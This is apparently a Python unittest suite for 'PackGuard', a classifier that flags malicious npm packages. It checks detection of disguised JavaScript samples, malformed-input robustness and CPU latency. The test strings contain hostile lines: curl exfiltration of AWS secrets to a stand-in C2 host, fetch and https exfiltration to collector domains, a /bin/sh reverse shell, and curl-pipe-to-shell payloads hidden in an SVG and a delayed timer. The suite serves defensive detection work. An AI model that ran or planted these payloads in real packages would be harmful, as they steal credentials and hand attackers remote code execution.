"""
PackGuard Stage 2 v5 — Milestone 4 Adversarial Challenger Verification Suite
Author: Milestone 4 Challenger 1 (challenger_m4_1)

Tests:
  1. Adversarial Evasion & False Negative Leakage Probes:
     - Injected child_process.exec / execSync inside benign packages
     - Injected fetch / https exfiltration inside benign packages
     - Evasion disguised via Rule 7 ("FormData", "CombinedStream", "mime")
     - Evasion disguised via Rule 4 (Large UI Bundle simulating react-intl-currency-input-fork)
     - Evasion disguised via Rule 3 (Zero-sink benign utility)
     - Evasion disguised via Rule 2 (Whitelisted dev hook like husky/tsc)
     - Evasion disguised via Rule 1 (Pure data tables)
     - Evasion disguised via Rule 5 & 6 (T2 small / medium utilities)
     - Advanced evasion unfolding: T9 Polyglot, T10 WASM, T11 Stego, T12 Time-Bomb
  2. Input Stress & Edge Cases:
     - Empty inputs, empty records, whitespace only, comments only
     - Single tokens, exact boundary tokens (255, 256, 511, 512, 1024, 2048)
     - Malformed records: missing keys, None values, non-string types, non-UTF8 surrogates
     - Multi-chunk packages with negative offsets, overlapping chunks, large payload arrays (>100KB)
  3. Latency & Throughput Benchmark:
     - Fast-Path AST Gate latency across 500 benign and malicious packages (< 0.15 ms)
     - Mean CPU throughput latency (< 0.50 ms)
     - Verification of 100% CPU execution (CPUExecutionProvider only)
"""

import os
import sys
import time
import json
import unittest
from pathlib import Path

# Enforce 100% CPU-only execution
os.environ["CUDA_VISIBLE_DEVICES"] = ""

V5_DIR = Path(__file__).resolve().parent.parent
if str(V5_DIR) not in sys.path:
    sys.path.insert(0, str(V5_DIR))

from stage2_filter import Stage2Filter, is_v5_false_alarm_benign, fast_cpu_tokenize, _analyze_package_structure
from text_formatter import extract_structural_features, extract_mitre_threat_labels


class AdversarialFalseNegativeProbeTest(unittest.TestCase):
    """
    Tries to sneak malicious execution/exfiltration payloads disguised as false alarms or benign bundles.
    Verifies that the Fast-Path AST Gate has ZERO false negative leakages.
    """

    @classmethod
    def setUpClass(cls):
        cls.filter = Stage2Filter(threshold=0.62)

    def test_probe_01_malicious_exec_inside_currency_input_fork(self):
        """Disguise child_process.exec inside react-intl-currency-input-fork bundle."""
        # Simulating currency input fork but with an injected exec payload
        code = """
        const React = require('react');
        const PropTypes = require('prop-types');
        // 25 requires to simulate large bundle
        """ + "\n".join([f"const mod_{i} = require('component-library-submodule-{i}');" for i in range(25)]) + """
        const cp = require('child_process');
        function CurrencyInput(props) {
            cp.exec('curl -X POST http://evil-c2.xyz -d ' + process.env.AWS_SECRET_ACCESS_KEY);
            return React.createElement('input', { value: props.value });
        }
        module.exports = CurrencyInput;
        """
        prob, label, tel = self.filter.predict(code)
        self.assertEqual(label, "MALWARE", f"Malicious currency-fork must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.62)
        self.assertFalse(tel.get("fast_path") and tel.get("reason") == "stage1_false_alarm_short_circuit")

    def test_probe_02_fetch_exfil_inside_large_ui_bundle(self):
        """Disguise async fetch exfiltration inside large UI bundle with >25 requires."""
        code = """
        const React = require('react');
        """ + "\n".join([f"const mod_{i} = require('very-long-ui-component-path-submodule-{i}');" for i in range(26)]) + """
        function submitForm(data) {
            fetch("https://oastify.com/collector", { method: "POST", body: JSON.stringify(data) });
        }
        module.exports = submitForm;
        """
        prob, label, tel = self.filter.predict(code)
        self.assertEqual(label, "MALWARE", f"Fetch exfiltration in UI bundle must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.62)

    def test_probe_03_formdata_mime_rule7_bypass_attempt(self):
        """Attempt to bypass via Rule 7 using 'FormData' or 'mime' while exfiltrating credentials."""
        # Rule 7 allows FormData/mime if no install hook, no cp, no proc, no exec, no eval
        # But what if payload uses https.request or net.Socket or fetch to an exfiltration endpoint?
        code = """
        const https = require('https');
        // Let's pretend to be form-data-lite
        const FormData = function() { this.mime = 'multipart/form-data'; };
        FormData.prototype.send = function(token) {
            const req = https.request({
                hostname: 'burpcollaborator.net',
                port: 443,
                path: '/exfil?token=' + token,
                method: 'GET'
            });
            req.end();
        };
        module.exports = FormData;
        """
        prob, label, tel = self.filter.predict(code)
        self.assertEqual(label, "MALWARE", f"Network exfil with FormData keyword must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.62)

    def test_probe_04_rule7_subtle_http_leak_with_mime_keyword(self):
        """Rule 7 probe: Can https.get leak data to a non-blacklisted domain with 'mime' keyword?"""
        code = """
        const https = require('https');
        const mime = { 'text/html': 1 };
        function reportTelemetry(info) {
            https.get('http://telemetry-sink-collection-987.org/log?info=' + info);
        }
        module.exports = { mime, reportTelemetry };
        """
        # Note: If no genuine_steal and no C2 blacklist, does it get caught by neural pass or AST?
        prob, label, tel = self.filter.predict(code)
        # Even if not malicious C2, it must NOT short-circuit as a benign false alarm if it has network sinks!
        is_fa = is_v5_false_alarm_benign(code)
        print(f"       [Probe 04] is_fa={is_fa}, prob={prob:.4f}, label={label}, engine={tel.get('engine')}")
        self.assertFalse(is_fa, "Rule 7 must NOT allow network sinks to short-circuit as false alarm!")

    def test_probe_05_reverse_shell_in_pure_data_lookalike(self):
        """Attempt to disguise net.Socket reverse shell inside pure data object."""
        code = """
        module.exports = {
            config: { port: 8080, host: '127.0.0.1' },
            connect: function() {
                const s = new (require('net').Socket)();
                const cp = require('child_process');
                s.connect(4444, '10.0.0.1', () => {
                    const sh = cp.spawn('/bin/sh', []);
                    s.pipe(sh.stdin);
                    sh.stdout.pipe(s);
                });
            }
        };
        """
        prob, label, tel = self.filter.predict(code)
        self.assertEqual(label, "MALWARE", f"Reverse shell must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.85)
        self.assertEqual(tel["mitre"]["mitre_exec"], 1)

    def test_probe_06_t2_mangled_child_process_inside_large_require_list(self):
        """T2 mangled child_process (13 chars) disguised with 25 dummy requires."""
        # In T2, identifier mangling makes child_process require('abcdefghijklm')
        code = """
        var v0 = require('abcdefghijklm'); // 13 chars
        """ + "\n".join([f"var v{i+1} = require('dummy-long-library-name-index-{i}');" for i in range(25)]) + """
        var v30 = v0['v31'];
        v30('whoami');
        """
        st = _analyze_package_structure({"chunks": [{"file": "index.js", "text": code}]})
        is_fa = is_v5_false_alarm_benign(st, text=st.get("_aggregated_code", ""))
        prob, label, tel = self.filter.predict(code)
        print(f"       [Probe 06] is_fa={is_fa}, prob={prob:.4f}, label={label}, tel={tel}")
        self.assertEqual(label, "MALWARE", f"T2 child_process with 25 requires must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.62)

    def test_probe_11_t2_small_utility_rule5_missing_cp_check(self):
        """Rule 5 probe: Can a small T2 package sneak child_process (13 chars) through Rule 5?"""
        code = """
        var v0 = require('abcdefghijklm');
        var v1 = v0['v2'];
        function run(a) { return v1(a); }
        module.exports = run;
        """
        st = _analyze_package_structure({"chunks": [{"file": "index.js", "text": code}]})
        is_fa = is_v5_false_alarm_benign(st, text=st.get("_aggregated_code", ""))
        prob, label, tel = self.filter.predict(code)
        print(f"       [Probe 11] is_fa={is_fa}, prob={prob:.4f}, label={label}, tel={tel}")
        self.assertEqual(label, "MALWARE", f"T2 child_process in small utility must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.62)


    def test_probe_07_polyglot_svg_script_injection(self):
        """T9 polyglot: Embedded malicious script inside SVG."""
        code = """<svg xmlns="http://www.w3.org/2000/svg">
        <script>
            require('child_process').execSync('curl http://attacker.xyz/sh | bash');
        </script>
        </svg>"""
        prob, label, tel = self.filter.predict(code)
        self.assertEqual(label, "MALWARE", f"SVG script injection must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.85)

    def test_probe_08_wasm_loader_bridge_with_eval_import(self):
        """T10 WASM: WebAssembly bridge binding eval/exec."""
        code = """
        const wasmBytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]);
        WebAssembly.instantiate(wasmBytes, {
            env: {
                sys_exec: function(cmd) { eval(cmd); }
            }
        });
        """
        prob, label, tel = self.filter.predict(code)
        self.assertEqual(label, "MALWARE", f"WASM bridge with eval must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.62)

    def test_probe_09_steganography_asset_payload(self):
        """T11 Stego: Non-code asset read followed by eval."""
        code = """
        const fs = require('fs');
        const buf = fs.readFileSync('logo.png');
        eval(buf.toString('utf-8'));
        """
        prob, label, tel = self.filter.predict(code)
        self.assertEqual(label, "MALWARE", f"Stego asset eval must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.62)

    def test_probe_10_timebomb_deferred_timer(self):
        """T12 Time-Bomb: Deferred setTimeout callback holding malicious payload."""
        code = """
        setTimeout(function() {
            const cp = require('child_process');
            cp.execSync('curl -s https://evil.com/payload | sh');
        }, 86400000);
        """
        prob, label, tel = self.filter.predict(code)
        self.assertEqual(label, "MALWARE", f"Time-bomb payload must be MALWARE, got {label} (prob={prob:.4f})")
        self.assertGreaterEqual(prob, 0.85)


class InputStressAndEdgeCaseTest(unittest.TestCase):
    """
    Stress test with dynamic token lengths, empty inputs, malformed records,
    and extreme package sizes.
    """

    @classmethod
    def setUpClass(cls):
        cls.filter = Stage2Filter(threshold=0.62)

    def test_stress_01_empty_inputs(self):
        """Empty string, whitespace only, None chunks, empty list."""
        test_cases = [
            "",
            "   \n\t  \r\n  ",
            {"package": "empty-1"},
            {"package": "empty-2", "chunks": []},
            {"package": "empty-3", "chunks": None},
            {"package": "empty-4", "chunks": [{"file": "index.js", "text": ""}]},
            {"package": "empty-5", "chunks": [{"file": "index.js", "text": "   // comment only\n"}]},
        ]
        for idx, tc in enumerate(test_cases):
            prob, label, tel = self.filter.predict(tc)
            self.assertEqual(label, "BENIGN", f"Case {idx} should be BENIGN, got {label}")
            self.assertLessEqual(prob, 0.35)

    def test_stress_02_dynamic_token_lengths(self):
        """Dynamic sequence lengths: 1, 10, 128, 255, 256, 511, 512, 1024, 2048."""
        lengths = [1, 10, 64, 128, 255, 256, 511, 512, 1024, 2048]
        for n in lengths:
            code = "var x = " + " + ".join([f"v{i}" for i in range(n)]) + ";"
            # Test tokenizer directly
            ids, mask = fast_cpu_tokenize(code, max_len=256)
            self.assertEqual(len(ids), 256)
            self.assertEqual(len(mask), 256)
            self.assertEqual(ids[0], 50281)  # [CLS]
            self.assertIn(50282, ids)        # [SEP]

            # Test predict on arbitrary length
            prob, label, tel = self.filter.predict(code)
            self.assertIn(label, ("BENIGN", "MALWARE"))
            self.assertTrue(0.0 <= prob <= 1.0)

    def test_stress_03_malformed_records(self):
        """Malformed chunk structures and non-standard types."""
        malformed_records = [
            ("none_fields", {"chunks": [{"file": None, "kind": None, "text": None}]}),
            ("string_start_offset", {"chunks": [{"file": "test.js", "start": "not_an_int", "text": "var a = 1;"}]}),
            ("negative_start_offset", {"chunks": [{"file": "test.js", "start": -100, "text": "var b = 2;"}]}),
            ("int_filename", {"chunks": [{"file": 12345, "text": "var c = 3;"}]}),
            ("missing_filename", {"chunks": [{"text": "var d = 4;"}]}),
            ("none_package_name", {"package": None, "chunks": [{"file": "index.js", "text": "module.exports = 42;"}]}),
            ("arbitrary_key_without_chunks", {"invalid_key": "some_data"}),
            ("chunks_string_not_list", {"chunks": "not_a_list"}),
        ]
        crashes = []
        for name, rec in malformed_records:
            try:
                prob, label, tel = self.filter.predict(rec)
                self.assertIn(label, ("BENIGN", "MALWARE"))
            except Exception as e:
                crashes.append((name, type(e).__name__, str(e)))

        print(f"       [Stress 03] Crashes encountered: {crashes}")
        self.assertEqual(len(crashes), 0, f"Malformed records caused unhandled exceptions: {crashes}")


    def test_stress_04_corrupted_unicode_and_null_bytes(self):
        """Corrupted escape codes, null bytes, surrogate pairs."""
        corrupted_codes = [
            "var a = '\\xGG\\xZZ malformed hex';",
            "var b = '\\u123 truncated unicode';",
            "var c = '\\uD800 lone surrogate';",
            "var d = 'null byte: \x00 in string';",
            "var e = '/* unclosed comment \x00';",
            "var f = 'eval(\\x00Buffer.from(\"test\"))';",
        ]
        for idx, code in enumerate(corrupted_codes):
            prob, label, tel = self.filter.predict(code)
            self.assertIn(label, ("BENIGN", "MALWARE"), f"Corrupted code {idx} crashed filter")
            self.assertTrue(0.0 <= prob <= 1.0)

    def test_stress_05_large_package_and_high_chunk_count(self):
        """Large package with 50 files and >100KB total text."""
        chunks = []
        for i in range(50):
            chunks.append({
                "file": f"lib/submodule_{i}.js",
                "kind": "js",
                "start": 0,
                "text": f"// Submodule {i}\n" + "var data = [1, 2, 3];\n" * 100 + f"module.exports = data;\n"
            })
        record = {"package": "massive-package@1.0.0", "chunks": chunks}
        t0 = time.perf_counter()
        prob, label, tel = self.filter.predict(record)
        elapsed = (time.perf_counter() - t0) * 1000.0
        self.assertEqual(label, "BENIGN")
        self.assertLessEqual(prob, 0.35)
        print(f"       [Stress 05] 50 chunks (150KB) evaluated in {elapsed:.2f} ms")


class LatencyAndThroughputBenchmark(unittest.TestCase):
    """
    Empirical benchmark:
      - Mean CPU inference latency < 0.50 ms / package
      - Fast-Path AST Gate short-circuit latency < 0.15 ms
      - Provider strictly CPUExecutionProvider
    """

    @classmethod
    def setUpClass(cls):
        cls.filter = Stage2Filter(threshold=0.62)

    def test_latency_01_cpu_execution_provider_strictly_enforced(self):
        """Ensure session uses CPUExecutionProvider and CUDA is disabled."""
        self.assertEqual(os.environ.get("CUDA_VISIBLE_DEVICES"), "")
        if self.filter.session is not None:
            providers = self.filter.session.get_providers()
            self.assertIn("CPUExecutionProvider", providers)
            self.assertNotIn("CUDAExecutionProvider", providers)
            self.assertNotIn("TensorrtExecutionProvider", providers)
            print(f"       [Latency 01] Active providers: {providers}")

    def test_latency_02_fast_path_gate_pure_data(self):
        """Fast-Path AST Gate on pure data packages must be < 0.15 ms."""
        pkg = {
            "package": "mime-db@1.54.0",
            "chunks": [{"file": "index.js", "kind": "js", "text": 'module.exports = {"app/json": {}};'}]
        }
        # Warm-up
        for _ in range(50):
            self.filter.predict(pkg)

        # Timed loop
        trials = 500
        t0 = time.perf_counter()
        for _ in range(trials):
            self.filter.predict(pkg)
        total_time_ms = (time.perf_counter() - t0) * 1000.0
        avg_latency_ms = total_time_ms / trials

        print(f"       [Latency 02] Fast-Path Pure Data ({trials} runs): {avg_latency_ms:.4f} ms / pkg (Target < 0.15 ms)")
        self.assertLess(avg_latency_ms, 0.15, f"Pure data latency {avg_latency_ms:.4f} ms exceeds 0.15 ms ceiling!")

    def test_latency_03_mean_standardized_throughput(self):
        """Standardized 500-inference throughput benchmark across mixed packages."""
        corpus = [
            {"package": "pkg-benign-1", "chunks": [{"file": "index.js", "text": "module.exports = { a: 1 };"}]},
            {"package": "pkg-benign-2", "chunks": [{"file": "index.js", "text": "function add(a, b) { return a + b; } module.exports = add;"}]},
            {"package": "pkg-fa-currency", "chunks": [{"file": "index.js", "text": "const MAP = { USD: '$' }; function fmt(v) { return MAP.USD + v; } module.exports = fmt;"}]},
            {"package": "pkg-fa-auth", "chunks": [{"file": "index.js", "text": "function parse(h) { return Buffer.from(h, 'base64').toString('utf8'); } module.exports = parse;"}]},
            {"package": "pkg-malware-shell", "chunks": [{"file": "index.js", "text": "const { exec } = require('child_process'); exec('curl http://c2.xyz -d ' + process.env.USER);"}]},
            {"package": "pkg-malware-t2", "chunks": [{"file": "index.js", "text": "var v0 = require('child_process'); v0.execSync('whoami');"}]},
            {"package": "pkg-trojan-sig", "chunks": [{"file": "index.js", "text": "const a = 1; express-eval(function(){});"}]},
        ]

        # Warm-up
        for _ in range(30):
            for p in corpus:
                self.filter.predict(p)

        n_runs = 500
        t0 = time.perf_counter()
        for i in range(n_runs):
            pkg = corpus[i % len(corpus)]
            self.filter.predict(pkg)
        total_ms = (time.perf_counter() - t0) * 1000.0
        mean_latency_ms = total_ms / n_runs

        print(f"       [Latency 03] Standardized Throughput ({n_runs} runs): {mean_latency_ms:.4f} ms / pkg (Target < 0.50 ms)")
        self.assertLess(mean_latency_ms, 0.50, f"Mean latency {mean_latency_ms:.4f} ms exceeds 0.50 ms ceiling!")


if __name__ == "__main__":
    unittest.main(verbosity=2)
